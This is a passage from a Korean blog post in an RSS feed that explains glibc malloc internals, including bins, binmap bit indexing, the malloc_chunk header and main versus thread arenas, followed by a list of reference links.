chunk를 할당 한 후에 남은 chunk가 배치된다.</p><ul><li>할당자는 요청한 크기와 일치하는 free chunk가 없으면, 요청한 크기보다 큰 free chunk를 요청 크기로 분할하는 경우가 있다.</li></ul><p>“bins”에 Unsorted bin, Small bin, Large bin가 포함하는 free chunk가 배치된다.</p><ul><li>이 변수는 배열 변수이며 총(128 * 2 - 2)254개의 chunk 포인터를 배치할 수 있다.</li><li>free chunk를 bins에 배치할 때 chunk의 fd, bk 정보를 저장하기 때문 배열의 크기가 128이 아닌 254이다.<ul><li>bins[0], bins[1]은 Unsorted bin들이 배치된다.</li></ul></li></ul><p>binmap은 bins를 4(BINMAPSIZE)개의 영역으로 나누어서 정보를 배치한다.</p><ul><li>binmap[0] : 0 ~ 31, binmap[1] : 32 ~ 64, binmap[2] : 65 ~ 96, binmap[3] : 97 ~128<ul><li>bins[]에 free chunk가 배치되면, binmap[]에는 그 bin이 해당하는 위치에 해당 bin의 bit가 배치된다.</li></ul></li><li>예를 들어 크기가 256byte인 free chunk의 인덱스는 65이며, binmap[2]에 bit정보가 저장된다.<ul><li>할당자는 idx2bit() 함수를 이용하여 저장할 bit값을 계산한다.</li><li>binmap[2]에는 2(1 &lt;&lt; (index(65) &amp; 31))가 배치된다.</li></ul></li><li>binmap[] 배열을 사용하면 많은양의 빈 검색이 간소화된다. </li></ul><p><img src="https://blog.kakaocdn.net/dn/pBIcq/btqFjp8GJ7q/gxaKHLkhjhohQOWN4cxsX1/img.png" alt="49"></p><p>next는 여러 arena가 있는 경우에 추가 arena을 연결하는 포인터다.</p><h3 id="struct-malloc-chunk-Chunk-Header"><a href="#struct-malloc-chunk-Chunk-Header" class="headerlink" title="struct malloc_chunk (Chunk Header)"></a>struct malloc_chunk (Chunk Header)</h3><p><img src="https://blog.kakaocdn.net/dn/wz1op/btqFnjetERJ/Z5fcLnkXBf0q8xmZIY5r51/img.png" alt="50"></p><ul><li>힙 영역은 사용자에 의해 할당되거나, 해제되거나 하면 Chunk라는 단위로 관리된다.</li><li>malloc_chunk는 현재 chunk의 크기와 바로 인접한 이전 chunk의 크기를 저장하고, 해제된 chunk는 bin에 의해 연결리스트로 관리되기 때문에 이중 연결리스트를 위한 포인터 주소를 저장한다.</li><li>마지막으로 있는 2개의 chunk 포인터는 large bin을 위해서만 사용된다. large bin은 다른 bin과 다르게 연결리스트에 크기를 대략적으로 관리하기 때문에 연결리스트 내부에서 크기 순으로 추가적인 연결리스트를 가진다.</li></ul><p>※ </p><ul><li>Main arena는 여러 개의 힙과 heap_info 구조체를 가질 수 없다. main arena의 공간이 부족한 경우, sbrk 힙 영역은 메모리가 매핑된 영역까지 확장(인접한 영역)된다.</li><li>thread arena와 달리, main arena의 arena header는 sbrk 힙 영역의 일부가 아니다. main arena는 전역 변수이며, libc.so의 데이터 영역에서 찾을 수 있다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/r2QXU/btqFlje0b56/Kgf2kinlQzkDsx1ARZ4oCk/img.png" alt="51"><br><img src="https://blog.kakaocdn.net/dn/1YJRM/btqFk7skjCc/WRXlVZCiMhjtggIgzbNri1/img.png" alt="52"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.lazenca.net/pages/viewpage.action?pageId=1147929">https://www.lazenca.net/pages/viewpage.action?pageId=1147929</a></li><li><a href="https://tribal1012.tistory.com/141">https://tribal1012.tistory.com/141</a></li><li><a href="https://tribal1012.tistory.com/78">https://tribal1012.tistory.com/78</a></li><li><a href="https://dreamhack.io/">https://dreamhack.io/</a></li><li><a href="http://studyfoss.egloos.com/5206220">http://studyfoss.egloos.com/5206220</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Linux/">Linux</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/malloc/">malloc</category>
      
      <category domain="https://pwnkidhn.github.io/tags/heap/">heap</category>
      
      <category domain="https://pwnkidhn.github.io/tags/linux/">linux</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/06/29/2020-06-30-malloc/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
